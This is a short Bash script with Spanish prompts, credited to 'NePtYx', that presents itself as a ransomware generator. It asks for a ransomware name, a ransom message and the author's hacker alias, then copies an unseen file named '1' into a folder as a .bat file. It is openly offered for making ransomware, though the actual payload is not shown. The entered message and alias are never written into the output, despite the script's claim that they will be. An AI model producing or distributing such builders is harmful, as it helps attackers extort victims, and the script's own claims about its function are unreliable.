clear
echo "Creador de ransomware"
echo " "
echo "by NePtYx"
echo " "
echo "Instrucciones:"
echo "1)Coloca el nombre de tu ransomware"
echo "2)Coloca el mensaje de tu ransomware"
echo "3)Introduce tu nombre de cracker o hacker"
echo "4)Y listo ransomware creado"
echo "ADVERTENCIA:Si no introduces tus datos bien"
echo "los datos en el ransomware apareceran con signos de"
echo "interrogacion."
echo " "
echo "Introduce el nombre de tu ransomware:"
echo " "
read input
echo " "
echo "Introduce el mensaje que dira tu ransomware:"
echo " "
read input1
echo " "
echo "Introduce tu nombre de cracker o hacker:"
echo " "
read input2
echo " "
clear
echo "Creador de ransomware"
echo " "
echo "by NePtYx"
echo " "
echo "Generando $input1..."
mkdir Creados
cp 1 $input.bat
mv $input.bat Creados
echo " "
echo "$input creado exitosamente..."
echo "Saliendo..."

